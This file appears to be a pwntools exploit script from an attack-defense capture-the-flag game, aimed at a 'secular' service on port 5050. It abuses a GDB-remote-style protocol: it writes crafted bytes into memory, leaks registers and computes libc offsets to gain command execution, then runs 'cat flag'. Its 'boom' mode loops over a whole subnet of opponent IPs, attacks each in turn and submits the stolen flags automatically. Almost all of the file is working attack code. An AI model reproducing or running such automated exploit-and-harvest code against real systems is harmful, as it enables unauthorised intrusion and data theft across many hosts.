#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from submit import submit_flag
from time import sleep
import threading
import os
from team import team

PREFIX = '172.16.5.'
TIMEOUT = 5 #TODO
DELAY = 30
LIST = range(10, 35) # victim pool
ME = 12
PORT = 5050

context.arch = 'amd64'
elf=ELF('./challs/secular')
libc=ELF("./libc.so.6")
libc_add=0

def exploit(r):
    def packet(data):
        checksum = '{:02x}'.format(sum(ord(c) for c in data)&0xFF)
        return '$' + data + '#' + checksum + '+'

    def rest():
        data = r.recvuntil('#')
        r.recv(2)
        return data

    def consume():
        crap = r.recvuntil('+')
        #print 'notification:', crap
        if r.recv(1) != '$':
            #r.interactive()
            raise Exception('wut')
        data = rest()
        r.send('+')
        return data

    def ex(data):
        r.send(packet(data))
        return consume()

    def regs():
        data = ex('g').strip('#').decode('hex')
        return struct.unpack('23I', data)

    def step():
        r.send(packet('c'))
        r.recvuntil('+')

    def mem(d, l):
        data = ex('m{:x},{:x}'.format(d, l))
        return data.strip('#').decode('hex')

    def setmem(d, dat):
        l = len(dat)
        ex('M{:x},{:x}:{:s}'.format(d, l, dat.encode('hex')))


    def pregs():
        re = regs()
        #print 'regs', ' '.join('{:08x}'.format(c) for c in re)
        return re

    def makeregs(r0=0, r1=0, r2=0, r3=0, r4=0, r5=0, r6=0, r7=0, r8=0,
                r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0, pc=0,
                sp=512, flag=0, blkinst=0, totalinst=0, blkcnt=0):
        a = [
                r0, r1, r2, r3, r4, r5, r6, r7,
                r8, r9, r10, r11, r12, r13, r14, r15,
                pc, sp, flag, blkinst, totalinst, blkcnt
        ]
        rr=''.join(p32(aa) for aa in a)
        r.send(packet(('G'+rr)))
        r.recvuntil('-')
    #r = remote('127.0.0.1', 2333)
    #r = remote('172.16.5.34', 5050)
    ex('g')
    ex('M0,12:431f3e1000004b0f020000004a0f00000000')
    ex('Z0,12,1')
    ex('Z0,64,1')
    ex('Z0,68,1')
    ex('z0,64,1')
    ex('z0,68,1')
    step()
    ex('z0,12,1')
    re = regs()
    #print re[15]
    #pause()
    off=4301279133-re[15]
    #print off
    pay='M12,24:431f'+p32(off&0xffffffff).encode('hex')+'4b0f020000004a0f00000000'
    ex(pay)
    ex('Z0,24,1')
    step()
    ex('z0,24,1')
    re = regs()
    #print '---'
    #print hex(re[15])

    off2 = off+2375
    off3 = off2-20
    off4 = re[15]*256+139637979671984
    tmp=p64(off4).encode('hex')
    assert len(tmp)==16

    pay2='M24,54:431f'+p32(off2&0xffffffff).encode('hex')+'4b0f08000000431f'+tmp[:8]+'4b0f00000000431f'+p32(off3&0xffffffff).encode('hex')+'4b0f08000000431f'+tmp[8:]+'4b0f00000000'
    ex(pay2)

    ex('Z0,54,1')
    step()
    ex('z0,54,1')

    off5 = re[15]*256+139637975998570
    tmp=p64(off5).encode('hex')
    assert len(tmp)==16
    pay3='M54,5e:4e'+tmp[8:]+'4e'+tmp[:8]
    ex(pay3)

    r.send(packet('Z0,5e,1'))
    step()
    r.send(packet('z0,5e,1')+'\necho AAAAA && cat flag && echo BBBBB\n')
    #r.sendline('cat flag')
    flag = r.recvuntil('BBBBB').split('\n')[2]
    r.close()
    return flag

def boom():
    while True:
        for i in LIST:
            if i == ME:
                continue
            ip = PREFIX + str(i)
            print 'pwning %s' % ip
            try:
                flag = exploit(remote(ip, PORT, timeout=TIMEOUT,))
                submit_flag(flag)
                success('pwned: %s %s' % (ip, team[ip]))
            except:
                warning('failed: %s %s' % (ip, team[ip]))
            #for j in range(10):
            #    exploit(remote(ip, PORT, timeout=TIMEOUT,), trash=True)
        sleep(DELAY)

if len(sys.argv) > 2: # attack one
    context.log_level = 'debug'
    submit_flag(exploit(remote(sys.argv[1], sys.argv[2], timeout=TIMEOUT)))
elif len(sys.argv) > 1:
    if sys.argv[1] == 'boom': # pwning all
        context.log_level = 'info'
        boom()
    else: # debug
        libc = ELF('/home/hdt/ldlibc/libc-2.24.dbg')
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        exploit(code.process())
        #r = remote('127.0.0.1', 4444)
else: # local
    libc = code.libc
    exploit(code.process())

